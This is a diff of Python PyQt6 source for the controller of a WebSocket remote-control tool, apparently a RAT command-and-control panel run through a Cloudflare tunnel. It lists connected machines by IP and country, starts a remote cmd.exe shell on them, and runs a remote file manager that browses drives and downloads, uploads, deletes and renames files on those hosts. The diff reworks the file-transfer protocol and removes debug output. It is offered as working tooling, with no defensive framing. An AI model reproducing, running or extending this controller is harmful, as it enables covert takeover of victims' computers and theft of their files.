@@ -9,8 +9,8 @@ import struct
 from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
-                             QMenu, QAbstractItemView, QTableWidget, QTableWidgetItem,
-                             QHeaderView, QMessageBox, QFileDialog, QInputDialog)
+                             QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
+                             QInputDialog, QFileDialog)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
 from PyQt6.QtGui import QColor, QPalette
 
@@ -21,75 +21,64 @@ WS_OP_CLOSE = 0x08
 WS_OP_PING = 0x09
 WS_OP_PONG = 0x0A
 
-MAX_CHUNK = 4096
+FILE_CHUNK = 65536
+
 
 def ws_compute_accept(key: bytes) -> bytes:
     magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
     sha1 = hashlib.sha1(key + magic).digest()
     return base64.b64encode(sha1)
 
+
 def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
     return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
+
 
 def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
     header = bytearray()
     b1 = (0x80 if fin else 0) | (opcode & 0x0f)
     header.append(b1)
     length = len(payload)
-    b2 = 0
     if length <= 125:
-        b2 |= length
-        header.append(b2)
+        header.append(length)
     elif length <= 0xFFFF:
-        b2 |= 126
-        header.append(b2)
+        header.append(126)
         header.extend(struct.pack(">H", length))
     else:
-        b2 |= 127
-        header.append(b2)
+        header.append(127)
         header.extend(struct.pack(">Q", length))
     return bytes(header) + payload
+
 
 def ws_parse_frame(data: bytearray):
     if len(data) < 2:
         return (None, None, None, 0)
     p = 0
-    b1 = data[p]
-    p += 1
-    b2 = data[p]
-    p += 1
+    b1 = data[p]; p += 1
+    b2 = data[p]; p += 1
     fin = bool(b1 & 0x80)
     opcode = b1 & 0x0F
     has_mask = bool(b2 & 0x80)
     payload_len = b2 & 0x7F
     if payload_len == 126:
-        if len(data) < p + 2:
-            return (None, None, None, 0)
-        payload_len = struct.unpack(">H", data[p:p+2])[0]
-        p += 2
+        if len(data) < p + 2: return (None, None, None, 0)
+        payload_len = struct.unpack(">H", data[p:p+2])[0]; p += 2
     elif payload_len == 127:
-        if len(data) < p + 8:
-            return (None, None, None, 0)
-        payload_len = struct.unpack(">Q", data[p:p+8])[0]
-        p += 8
+        if len(data) < p + 8: return (None, None, None, 0)
+        payload_len = struct.unpack(">Q", data[p:p+8])[0]; p += 8
     mask_key = b""
     if has_mask:
-        if len(data) < p + 4:
-            return (None, None, None, 0)
-        mask_key = data[p:p+4]
-        p += 4
+        if len(data) < p + 4: return (None, None, None, 0)
+        mask_key = data[p:p+4]; p += 4
     total_need = p + payload_len
     if len(data) < total_need:
         return (None, None, None, 0)
     raw_payload = data[p:p+payload_len]
-    if has_mask:
-        payload = ws_unmask_payload(raw_payload, mask_key)
-    else:
-        payload = raw_payload
-    consumed = total_need
-    return (fin, opcode, payload, consumed)
+    payload = ws_unmask_payload(raw_payload, mask_key) if has_mask else raw_payload
+    return (fin, opcode, payload, total_need)
 
-def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str, str, str]:
+
+def ws_handle_http_upgrade(sock: socket.socket):
     buf = bytearray()
     start = time.time()
     try:
@@ -98,13 +87,13 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str, str, str]:
                 return False, "", "", ""
             chunk = sock.recv(1024)
             if not chunk:
-                time.sleep(0.01)
-                continue
+                time.sleep(0.01); continue
             buf.extend(chunk)
             if b"\r\n\r\n" in buf:
                 break
     except Exception:
         return False, "", "", ""
+
     first_line = buf.split(b"\r\n")[0]
     parts = first_line.split(b" ")
     if len(parts) < 3:
@@ -112,40 +101,33 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str, str, str]:
     method, path, proto = parts
     if path not in (b"/", b"/ws"):
         return False, "", "", ""
+
     headers = {}
     for line in buf.split(b"\r\n")[1:]:
-        if not line:
-            continue
+        if not line: continue
         if b":" in line:
             k_raw, v_raw = line.split(b":", 1)
-            k = bytes(k_raw).strip().lower()
-            v = bytes(v_raw).strip()
-            headers[k] = v
+            headers[bytes(k_raw).strip().lower()] = bytes(v_raw).strip()
+
     real_ip = headers.get(b"cf-connecting-ip", b"").decode("utf-8").strip()
-    country = headers.get(b"cf-ipcountry", b"").decode("utf-8").strip()
-    if not country:
-        country = "XX"
+    country = headers.get(b"cf-ipcountry", b"").decode("utf-8").strip() or "XX"
     display_name = f"[{country}] {real_ip}" if real_ip else f"[{country}] 未知IP"
+
     conn_val = headers.get(b"connection", b"")
     upgrade_val = headers.get(b"upgrade", b"")
     ws_key = headers.get(b"sec-websocket-key")
     ws_version = headers.get(b"sec-websocket-version")
-    if conn_val != b"Upgrade":
-        return False, real_ip, country, display_name
-    if upgrade_val != b"websocket":
-        return False, real_ip, country, display_name
-    if not ws_key:
-        return False, real_ip, country, display_name
-    if ws_version != b"13":
-        return False, real_ip, country, display_name
+
+    if conn_val != b"Upgrade": return False, real_ip, country, display_name
+    if upgrade_val != b"websocket": return False, real_ip, country, display_name
+    if not ws_key: return False, real_ip, country, display_name
+    if ws_version != b"13": return False, real_ip, country, display_name
+
     accept_val = ws_compute_accept(ws_key)
-    resp = (
-        b"HTTP/1.1 101 Switching Protocols\r\n"
-        b"Upgrade: websocket\r\n"
-        b"Connection: Upgrade\r\n"
-        b"Sec-WebSocket-Accept: " + accept_val + b"\r\n"
-        b"\r\n"
-    )
+    resp = (b"HTTP/1.1 101 Switching Protocols\r\n"
+            b"Upgrade: websocket\r\n"
+            b"Connection: Upgrade\r\n"
+            b"Sec-WebSocket-Accept: " + accept_val + b"\r\n\r\n")
     try:
         sock.sendall(resp)
     except Exception:
@@ -155,12 +137,12 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str, str, str]:
 
 class ClientSignals(QObject):
     on_outp = pyqtSignal(object, str)
-    on_vfs_reply = pyqtSignal(object, bytes)
     on_disconnect = pyqtSignal(object)
+    on_fs = pyqtSignal(object, bytes)
 
 
 class ClientSession:
-    def __init__(self, conn: socket.socket, ip: str, country: str, display_name: str):
+    def __init__(self, conn, ip, country, display_name):
         self.conn = conn
         self.ip = ip
         self.country = country
@@ -175,17 +157,14 @@ class ClientSession:
 
     def send_packet(self, body: bytes) -> bool:
         if not self.connected:
-            print(f"[DEBUG] send_packet fail: session {self.display_name} disconnected")
             return False
         try:
             full_body = struct.pack(">I", len(body)) + body
             ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
             with self._send_lock:
                 self.conn.sendall(ws_frame)
-            print(f"[DEBUG] send_packet -> {self.display_name} cmd={body[:4].decode('ascii','replace')} len={len(body)}")
             return True
         except (OSError, BrokenPipeError):
-            print(f"[DEBUG] send_packet exception, close session {self.display_name}")
             self.close()
             return False
 
@@ -196,18 +175,13 @@ class ClientSession:
     def close(self):
         self.connected = False
         try:
-            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
-            self.conn.sendall(frame_close)
+            self.conn.sendall(ws_build_server_frame(True, WS_OP_CLOSE, b""))
         except Exception:
             pass
-        try:
-            self.conn.shutdown(socket.SHUT_RDWR)
-        except Exception:
-            pass
-        try:
-            self.conn.close()
-        except Exception:
-            pass
+        try: self.conn.shutdown(socket.SHUT_RDWR)
+        except Exception: pass
+        try: self.conn.close()
+        except Exception: pass
 
 
 class RemoteCmdDialog(QDialog):
@@ -218,23 +192,28 @@ class RemoteCmdDialog(QDialog):
         self.resize(680, 450)
         self.client = client_session
         self.is_alive = True
+
         lay = QVBoxLayout(self)
         info_bar = QHBoxLayout()
         info_bar.addWidget(QLabel(f"🌍 国家: {client_session.country}"))
         info_bar.addWidget(QLabel(f"📡 IP: {client_session.ip}"))
         info_bar.addStretch()
         lay.addLayout(info_bar)
+
         self.out_box = QTextEdit()
         self.out_box.setReadOnly(True)
         lay.addWidget(self.out_box)
+
         input_lay = QHBoxLayout()
         self.cmd_input = QLineEdit()
         self.cmd_input.setPlaceholderText("输入命令回车执行")
         self.cmd_input.returnPressed.connect(self.on_enter_command)
         input_lay.addWidget(self.cmd_input)
         lay.addLayout(input_lay)
+
         self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
         self.client.send_packet(b"SPAW")
+
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode)
 
@@ -274,57 +253,58 @@ class RemoteCmdDialog(QDialog):
         super().closeEvent(event)
 
 
-class RemoteFileDialog(QDialog):
+class FileManagerDialog(QDialog):
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
         self.main_window = parent
         self.client = client_session
-        self.setWindowTitle(f"远程文件管理器 - {client_session.display_name}")
-        self.resize(860, 540)
-        self.current_path = b"C:\\"
-        self.is_alive = True
+        self.setWindowTitle(f"远程文件管理 - {client_session.display_name}")
+        self.resize(900, 600)
 
-        self.download_active = False
-        self.dst_download_path = ""
-        self.download_remote_fullpath = b""
-        self.download_offset = 0
+        self.current_path = ""
+        self.download_buf = bytearray()
+        self.download_total = 0
+        self.download_name = ""
+        self.upload_file = None
+        self.upload_total = 0
+        self.upload_sent = 0
+        self.upload_path = ""
+        self.fs_events = []
 
         lay = QVBoxLayout(self)
-        addr_layout = QHBoxLayout()
-        self.btn_back = QPushButton("←上级")
-        self.btn_back.clicked.connect(self.go_parent)
-        addr_layout.addWidget(self.btn_back)
-        self.address_edit = QLineEdit()
-        self.address_edit.returnPressed.connect(self.on_address_enter)
-        addr_layout.addWidget(self.address_edit)
-        self.btn_refresh = QPushButton("刷新")
-        self.btn_refresh.clicked.connect(self.refresh_list)
-        addr_layout.addWidget(self.btn_refresh)
-        self.btn_mkdir = QPushButton("新建文件夹")
-        self.btn_mkdir.clicked.connect(self.new_folder)
-        addr_layout.addWidget(self.btn_mkdir)
-        self.btn_del = QPushButton("删除选中")
-        self.btn_del.clicked.connect(self.delete_selected)
-        addr_layout.addWidget(self.btn_del)
-        self.btn_upload = QPushButton("上传文件")
-        self.btn_upload.clicked.connect(self.do_upload_file)
-        addr_layout.addWidget(self.btn_upload)
-        lay.addLayout(addr_layout)
+        path_lay = QHBoxLayout()
+        self.path_edit = QLineEdit()
+        self.path_edit.setPlaceholderText("输入路径，如 C:\\ 或 C:\\Users")
+        self.path_edit.returnPressed.connect(self.on_go)
+        path_lay.addWidget(self.path_edit)
+        btn_go = QPushButton("转到"); btn_go.clicked.connect(self.on_go); path_lay.addWidget(btn_go)
+        btn_up = QPushButton("上级"); btn_up.clicked.connect(self.on_up); path_lay.addWidget(btn_up)
+        btn_refresh = QPushButton("刷新"); btn_refresh.clicked.connect(self.on_refresh); path_lay.addWidget(btn_refresh)
+        lay.addLayout(path_lay)
 
-        self.table = QTableWidget()
-        self.table.setColumnCount(3)
-        self.table.setHorizontalHeaderLabels(["名称", "类型", "大小"])
-        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
-        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
-        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
-        self.table.doubleClicked.connect(self.on_double_click_item)
-        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
-        self.table.customContextMenuRequested.connect(self.on_table_right_menu)
-        lay.addWidget(self.table)
+        self.tree = QTreeWidget()
+        self.tree.setHeaderLabels(["名称", "大小", "类型", "完整路径"])
+        self.tree.setColumnWidth(0, 260)
+        self.tree.setColumnWidth(1, 100)
+        self.tree.setColumnWidth(2, 60)
+        self.tree.itemDoubleClicked.connect(self.on_double_click)
+        self.tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
+        self.tree.customContextMenuRequested.connect(self.on_context_menu)
+        lay.addWidget(self.tree)
 
-        self.address_edit.setText(self.current_path.decode("utf-8"))
-        self.refresh_list()
+        self.log_box = QTextEdit()
+        self.log_box.setReadOnly(True)
+        self.log_box.setMaximumHeight(120)
+        lay.addWidget(self.log_box)
 
+        client_session.signals.on_fs.connect(self.on_fs_data)
+
+        self.timer = QTimer(self)
+        self.timer.setInterval(50)
+        self.timer.timeout.connect(self.process_fs_events)
+        self.timer.start()
+
+        self.client.send_packet(b"FDRV")
         if parent and hasattr(parent, 'is_dark_mode'):
             self.apply_theme(parent.is_dark_mode)
 
@@ -333,247 +313,232 @@ class RemoteFileDialog(QDialog):
             self.setStyleSheet("""
                 QDialog { background-color: #1e1e1e; }
                 QLabel { color: #d4d4d4; }
-                QTableWidget { background-color: #2d2d2d; color: #d4d4d4; border:1px solid #3d3d3d; gridline-color:#444; }
-                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border:1px solid #3d3d3d; }
-                QPushButton { background-color:#3d3d3d; color:#d4d4d4; border:1px solid #4d4d4d; padding:4px; }
+                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
+                QTreeWidget { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
+                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
+                QPushButton { background-color: #3d3d3d; color: #d4d4d4; border: 1px solid #4d4d4d; padding: 4px 10px; }
             """)
         else:
             self.setStyleSheet("")
 
-    def send_list_req(self, path: bytes):
-        self.client.send_packet(b"LIST" + path)
-
-    def refresh_list(self):
-        self.table.setRowCount(0)
-        self.address_edit.setText(self.current_path.decode("utf-8"))
-        self.send_list_req(self.current_path)
-
-    def go_parent(self):
-        p = self.current_path.decode("utf-8")
-        stripped = p.rstrip("\\/")
-        idx = stripped.rfind("\\")
-        if idx <= 0:
-            self.current_path = b"C:\\"
-        else:
-            newp = stripped[:idx] + "\\"
-            self.current_path = newp.encode("utf-8")
-        self.refresh_list()
-
-    def on_address_enter(self):
-        text = self.address_edit.text().strip()
-        if not text.endswith("\\"):
-            text += "\\"
-        self.current_path = text.encode("utf-8")
-        self.refresh_list()
+    def log(self, msg):
+        self.log_box.append(msg)
 
     @pyqtSlot(object, bytes)
-    def on_vfs_response(self, sess: ClientSession, payload: bytes):
-        if sess is not self.client or not self.is_alive:
-            return
-        cmd = payload[:4]
-        body = payload[4:]
-        if cmd == b"LIST":
-            self.parse_list_result(body)
-        elif cmd == b"READ":
-            self.handle_read_chunk(body)
-        elif cmd == b"WRIT":
-            QMessageBox.information(self, "上传结果", body.decode("utf‑8","replace"))
-            self.refresh_list()
-        elif cmd == b"MKDIR":
-            QMessageBox.information(self, "新建文件夹", body.decode("utf‑8","replace"))
-            self.refresh_list()
-        elif cmd == b"DEL_":
-            QMessageBox.information(self, "删除结果", body.decode("utf‑8","replace"))
-            self.refresh_list()
-        elif cmd == b"MOVE":
-            QMessageBox.information(self, "重命名/移动结果", body.decode("utf‑8","replace"))
-            self.refresh_list()
+    def on_fs_data(self, sess, body: bytes):
+        self.fs_events.append(bytes(body))
 
-    def parse_list_result(self, body: bytes):
-        text = body.decode("utf-8", errors="replace")
-        if text.startswith("ERR:"):
-            QMessageBox.warning(self, "错误", f"读取目录失败：{text}")
-            return
-        lines = text.splitlines()
-        self.table.setRowCount(0)
-        for line in lines:
-            if not line.strip():
-                continue
-            parts = line.split("|")
-            if len(parts) !=3:
-                continue
-            is_dir_str, size_str, full_remote_path = parts
-            if "\\" in full_remote_path:
-                display_name = full_remote_path.rsplit("\\",1)[-1]
+    def process_fs_events(self):
+        while self.fs_events:
+            body = self.fs_events.pop(0)
+            self.handle_fs_packet(body)
+
+    def handle_fs_packet(self, body: bytes):
+        if len(body) < 4: return
+        cmd = body[0:4]
+        payload = body[4:]
+
+        if cmd == b"FDRV":
+            text = payload.decode("gbk", errors="replace")
+            drives = [d for d in text.split("|") if d]
+            self.tree.clear()
+            for d in drives:
+                item = QTreeWidgetItem([d, "", "驱动器", d])
+                self.tree.addTopLevelItem(item)
+
+        elif cmd == b"FDIR":
+            text = payload.decode("gbk", errors="replace")
+            self.tree.clear()
+            for entry in text.split(";"):
+                if not entry: continue
+                parts = entry.split("|")
+                if len(parts) < 4: continue
+                name, full, size, typ = parts[0], parts[1], parts[2], parts[3]
+                try:
+                    sz = int(size)
+                    size_str = self.format_size(sz) if typ == "F" else ""
+                except ValueError:
+                    size_str = ""
+                type_str = "目录" if typ == "D" else "文件"
+                item = QTreeWidgetItem([name, size_str, type_str, full])
+                self.tree.addTopLevelItem(item)
+
+        elif cmd == b"FMET":
+            text = payload.decode("gbk", errors="replace")
+            parts = text.split("|", 1)
+            if len(parts) == 2:
+                self.download_name = parts[0]
+                self.download_total = int(parts[1])
+                self.download_buf = bytearray()
+                self.log(f"[下载] {self.download_name} ({self.download_total} 字节)")
+
+        elif cmd == b"FDAT":
+            if len(payload) < 8: return
+            offset = struct.unpack("<Q", payload[0:8])[0]
+            data = payload[8:]
+            if offset == len(self.download_buf):
+                self.download_buf.extend(data)
             else:
-                display_name = full_remote_path
-            row = self.table.rowCount()
-            self.table.insertRow(row)
-            item_name = QTableWidgetItem(display_name)
-            item_name.setData(Qt.ItemDataRole.UserRole, full_remote_path)
-            item_type = QTableWidgetItem("文件夹" if is_dir_str=="1" else "文件")
-            item_size = QTableWidgetItem(size_str)
-            self.table.setItem(row,0,item_name)
-            self.table.setItem(row,1,item_type)
-            self.table.setItem(row,2,item_size)
+                self.log(f"[下载] 偏移异常 {offset} != {len(self.download_buf)}")
+            if self.download_total > 0 and len(self.download_buf) >= self.download_total:
+                self.finish_download()
 
-    def on_double_click_item(self, index: QModelIndex):
-        row = index.row()
-        name_item = self.table.item(row,0)
-        type_item = self.table.item(row,1)
-        full_path_str = name_item.data(Qt.ItemDataRole.UserRole)
-        ftype = type_item.text()
-        if ftype == "文件夹":
-            self.current_path = full_path_str.encode("utf-8")
-            self.refresh_list()
+        elif cmd == b"FACK":
+            if len(payload) >= 8:
+                offset = struct.unpack("<Q", payload[0:8])[0]
+                self.upload_sent = offset
+                if self.upload_file and self.upload_sent < self.upload_total:
+                    self.send_next_upload_chunk()
 
-    def on_table_right_menu(self, pos):
-        idx = self.table.indexAt(pos)
-        if not idx.isValid():
-            return
-        row = idx.row()
-        name_item = self.table.item(row,0)
-        type_item = self.table.item(row,1)
-        filename_display = name_item.text()
-        full_remote_str = name_item.data(Qt.ItemDataRole.UserRole)
-        ftype = type_item.text()
-        full_remote_bytes = full_remote_str.encode("utf‑8")
-        menu = QMenu()
-        act_download = menu.addAction("下载到本地")
-        act_rename = menu.addAction("重命名")
-        ret = menu.exec(self.table.viewport().mapToGlobal(pos))
-        if ret == act_download:
-            if ftype == "文件夹":
-                QMessageBox.warning(self,"提示","暂不支持文件夹下载，仅支持单个文件")
-                return
-            self.start_download(full_remote_bytes, filename_display)
-        elif ret == act_rename:
-            self.do_rename(full_remote_bytes, filename_display)
+        elif cmd == b"FOK":
+            self.log("[OK]")
 
-    def new_folder(self):
-        name, ok = QInputDialog.getText(self, "新建文件夹", "文件夹名称:")
-        if not ok or not name.strip():
-            return
-        full = (self.current_path.decode("utf‑8") + name.strip()).encode("utf‑8")
-        self.client.send_packet(b"MKDIR"+full)
+        elif cmd == b"FERR":
+            self.log(f"[错误] {payload.decode('gbk', errors='replace')}")
 
-    def delete_selected(self):
-        rows = set(idx.row() for idx in self.table.selectedIndexes())
-        if not rows:
-            return
-        reply = QMessageBox.question(self,"确认删除","确定删除选中项？不可恢复！")
-        if reply != QMessageBox.StandardButton.Yes:
-            return
-        for r in rows:
-            name_item = self.table.item(r,0)
-            full_remote_str = name_item.data(Qt.ItemDataRole.UserRole)
-            fullpath = full_remote_str.encode("utf‑8")
-            self.client.send_packet(b"DEL_"+fullpath)
-
-    def do_rename(self, old_full:bytes, old_name:str):
-        new_name, ok = QInputDialog.getText(self,"重命名","输入新名称:", text=old_name)
-        if not ok or not new_name.strip():
-            return
-        old_str = old_full.decode("utf‑8")
-        if "\\" in old_str:
-            parent_dir = old_str.rsplit("\\",1)[0] + "\\"
+    def finish_download(self):
+        save_path, _ = QFileDialog.getSaveFileName(self, "保存文件", self.download_name)
+        if save_path:
+            with open(save_path, "wb") as f:
+                f.write(self.download_buf)
+            self.log(f"[下载完成] {save_path} ({len(self.download_buf)} 字节)")
         else:
-            parent_dir = old_str
-        new_full = (parent_dir + new_name.strip()).encode("utf‑8")
-        payload = old_full + b"\x00" + new_full
-        self.client.send_packet(b"MOVE" + payload)
+            self.log("[下载取消]")
+        self.download_buf = bytearray()
+        self.download_total = 0
+        self.download_name = ""
 
-    def start_download(self, remote_full:bytes, filename:str):
-        save_path, _ = QFileDialog.getSaveFileName(self, "保存文件到本地", filename)
-        if not save_path:
-            return
-        self.dst_download_path = save_path
-        self.download_remote_fullpath = remote_full
-        self.download_offset = 0
-        self.download_active = True
-        self.request_next_download_chunk()
+    @staticmethod
+    def format_size(n):
+        for unit in ["B", "KB", "MB", "GB", "TB"]:
+            if n < 1024: return f"{n:.1f} {unit}"
+            n /= 1024
+        return f"{n:.1f} PB"
 
-    def request_next_download_chunk(self):
-        if not self.download_active:
-            return
-        path = self.download_remote_fullpath
-        payload = path + b"\x00" + struct.pack("<Q", self.download_offset) + struct.pack("<I", MAX_CHUNK)
-        self.client.send_packet(b"READ" + payload)
+    def on_go(self):
+        path = self.path_edit.text().strip()
+        if path:
+            self.current_path = path
+            self.client.send_packet(b"FDIR" + path.encode("gbk", errors="replace"))
 
-    def handle_read_chunk(self, body:bytes):
-        if not self.download_active:
-            return
-        offset = struct.unpack_from("<Q", body, 0)[0]
-        chunk_data = body[8:]
-        if offset != self.download_offset:
-            self.download_active = False
-            return
-        if len(chunk_data) == 0:
-            self.download_active = False
-            QMessageBox.information(self,"下载完成",f"文件已保存：{self.dst_download_path}")
-            return
+    def on_up(self):
+        if not self.current_path: return
+        p = self.current_path.rstrip("\\")
+        idx = p.rfind("\\")
+        if idx <= 1:
+            self.client.send_packet(b"FDRV")
+            self.current_path = ""
+        else:
+            self.current_path = p[:idx]
+            self.path_edit.setText(self.current_path)
+            self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
+
+    def on_refresh(self):
+        if self.current_path:
+            self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
+        else:
+            self.client.send_packet(b"FDRV")
+
+    def on_double_click(self, item, col):
+        typ = item.text(2)
+        full = item.text(3)
+        if typ in ("目录", "驱动器"):
+            self.current_path = full
+            self.path_edit.setText(full)
+            self.client.send_packet(b"FDIR" + full.encode("gbk", errors="replace"))
+        elif typ == "文件":
+            self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))
+
+    def on_context_menu(self, pos):
+        item = self.tree.itemAt(pos)
+        if not item: return
+        typ = item.text(2)
+        full = item.text(3)
+        menu = QMenu()
+        act_download = menu.addAction("下载") if typ == "文件" else None
+        act_upload = menu.addAction("上传到此目录") if typ in ("目录", "驱动器") else None
+        act_delete = menu.addAction("删除")
+        act_rename = menu.addAction("重命名")
+        act_mkdir = menu.addAction("新建文件夹") if typ in ("目录", "驱动器") else None
+        ret = menu.exec(self.tree.viewport().mapToGlobal(pos))
+        if act_download and ret == act_download:
+            self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))
+        elif act_upload and ret == act_upload:
+            self.start_upload_to(full)
+        elif ret == act_delete:
+            self.client.send_packet(b"FDEL" + full.encode("gbk", errors="replace"))
+            QTimer.singleShot(500, self.on_refresh)
+        elif ret == act_rename:
+            new_name, ok = QInputDialog.getText(self, "重命名", "新名称:", text=item.text(0))
+            if ok and new_name:
+                parent = full.rsplit("\\", 1)[0]
+                new_full = parent + "\\" + new_name
+                payload = f"{full}|{new_full}"
+                self.client.send_packet(b"FREN" + payload.encode("gbk", errors="replace"))
+                QTimer.singleShot(500, self.on_refresh)
+        elif act_mkdir and ret == act_mkdir:
+            name, ok = QInputDialog.getText(self, "新建文件夹", "名称:")
+            if ok and name:
+                new_dir = full.rstrip("\\") + "\\" + name
+                self.client.send_packet(b"FMKD" + new_dir.encode("gbk", errors="replace"))
+                QTimer.singleShot(500, self.on_refresh)
+
+    def start_upload_to(self, remote_dir):
+        local_path, _ = QFileDialog.getOpenFileName(self, "选择要上传的文件")
+        if not local_path: return
+        fname = os.path.basename(local_path)
+        remote_path = remote_dir.rstrip("\\") + "\\" + fname
         try:
-            with open(self.dst_download_path,"ab") as f:
-                f.write(chunk_data)
-        except Exception as e:
-            self.download_active = False
-            QMessageBox.critical(self,"下载错误",f"写入本地失败：{str(e)}")
-            return
-        self.download_offset += len(chunk_data)
-        QTimer.singleShot(50, self.request_next_download_chunk)
+            self.upload_file = open(local_path, "rb")
+        except OSError as e:
+            self.log(f"[上传失败] {e}"); return
+        self.upload_total = os.path.getsize(local_path)
+        self.upload_sent = 0
+        self.upload_path = remote_path
+        args = f"{remote_path}|{self.upload_total}"
+        self.client.send_packet(b"FPUT" + args.encode("gbk", errors="replace"))
+        self.log(f"[上传] {fname} ({self.upload_total} 字节) -> {remote_path}")
 
-    def do_upload_file(self):
-        local_path, _ = QFileDialog.getOpenFileName(self, "选择要上传的本地文件")
-        if not local_path:
+    def send_next_upload_chunk(self):
+        if not self.upload_file: return
+        chunk = self.upload_file.read(FILE_CHUNK)
+        if not chunk:
+            self.upload_file.close()
+            self.upload_file = None
+            self.log("[上传完成]")
+            QTimer.singleShot(500, self.on_refresh)
             return
-        basename = os.path.basename(local_path)
-        remote_full = (self.current_path.decode("utf‑8") + basename).encode("utf‑8")
-        threading.Thread(target=self._upload_worker, args=(local_path, remote_full), daemon=True).start()
-
-    def _upload_worker(self, local_path:str, remote_full:bytes):
-        offset = 0
-        try:
-            with open(local_path,"rb") as f:
-                while True:
-                    chunk = f.read(MAX_CHUNK)
-                    if not chunk:
-                        break
-                    payload = remote_full + b"\x00" + struct.pack("<Q", offset) + chunk
-                    self.client.send_packet(b"WRIT" + payload)
-                    offset += len(chunk)
-                    time.sleep(0.02)
-        except Exception as e:
-            pass
-        QTimer.singleShot(200, self.refresh_list)
+        offset = self.upload_sent
+        body = b"FDAT" + struct.pack("<Q", offset) + chunk
+        self.client.send_packet(body)
 
     def closeEvent(self, event):
-        self.is_alive = False
-        self.download_active = False
-        if self.main_window and self.client in self.main_window.open_file_dialogs:
-            del self.main_window.open_file_dialogs[self.client]
+        self.timer.stop()
+        if self.upload_file:
+            self.upload_file.close()
         super().closeEvent(event)
 
 
 class ClientListModel(QAbstractListModel):
     def __init__(self):
         super().__init__()
-        self.items: list[ClientSession] = []
+        self.items = []
 
     def rowCount(self, parent=QModelIndex()):
         return len(self.items)
 
-    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
+    def data(self, index, role=Qt.ItemDataRole.DisplayRole):
         if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
             return QVariant()
         s = self.items[index.row()]
         return QVariant(f"{s.display_name} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")
 
-    def add(self, sess: ClientSession):
+    def add(self, sess):
         self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
         self.items.append(sess)
         self.endInsertRows()
 
-    def remove_by_obj(self, sess: ClientSession):
+    def remove_by_obj(self, sess):
         idx = self.items.index(sess)
         self.beginRemoveRows(QModelIndex(), idx, idx)
         self.items.pop(idx)
@@ -587,29 +552,26 @@ class MainWindow(QMainWindow):
         self.is_dark_mode = False
         self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
         self.resize(720, 520)
-        self.server_sock: socket.socket | None = None
+        self.server_sock = None
         self.server_running = False
         self.client_model = ClientListModel()
-        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
-        self.open_file_dialogs: dict[ClientSession, RemoteFileDialog] = {}
+        self.open_cmd_dialogs = {}
+        self.open_file_dialogs = {}
 
         w = QWidget()
         self.setCentralWidget(w)
         lay = QVBoxLayout(w)
+
         top_lay = QHBoxLayout()
         top_lay.addWidget(QLabel("监听端口:"))
         self.port_edit = QLineEdit("3306")
         top_lay.addWidget(self.port_edit)
-        self.btn_start = QPushButton("启动监听")
-        self.btn_start.clicked.connect(self.start_server)
+        self.btn_start = QPushButton("启动监听"); self.btn_start.clicked.connect(self.start_server)
         top_lay.addWidget(self.btn_start)
-        self.btn_stop = QPushButton("停止监听")
-        self.btn_stop.clicked.connect(self.stop_server)
-        self.btn_stop.setEnabled(False)
-        top_lay.addWidget(self.btn_stop)
+        self.btn_stop = QPushButton("停止监听"); self.btn_stop.clicked.connect(self.stop_server)
+        self.btn_stop.setEnabled(False); top_lay.addWidget(self.btn_stop)
         top_lay.addStretch()
-        self.btn_theme = QPushButton("🌙 夜间模式")
-        self.btn_theme.clicked.connect(self.toggle_theme)
+        self.btn_theme = QPushButton("🌙 夜间模式"); self.btn_theme.clicked.connect(self.toggle_theme)
         top_lay.addWidget(self.btn_theme)
         lay.addLayout(top_lay)
 
@@ -619,6 +581,7 @@ class MainWindow(QMainWindow):
         self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
         self.view.customContextMenuRequested.connect(self.on_context_menu)
         lay.addWidget(self.view)
+
         self.log_box = QTextEdit()
         self.log_box.setReadOnly(True)
         lay.addWidget(self.log_box)
@@ -626,8 +589,8 @@ class MainWindow(QMainWindow):
         self.ping_timer = QTimer(self)
         self.ping_timer.setInterval(10000)
         self.ping_timer.timeout.connect(self.broadcast_ping)
+
         self.apply_theme(False)
-        print("==== 主控端调试控制台输出窗口 ====")
 
     def apply_theme(self, dark: bool):
         self.is_dark_mode = dark
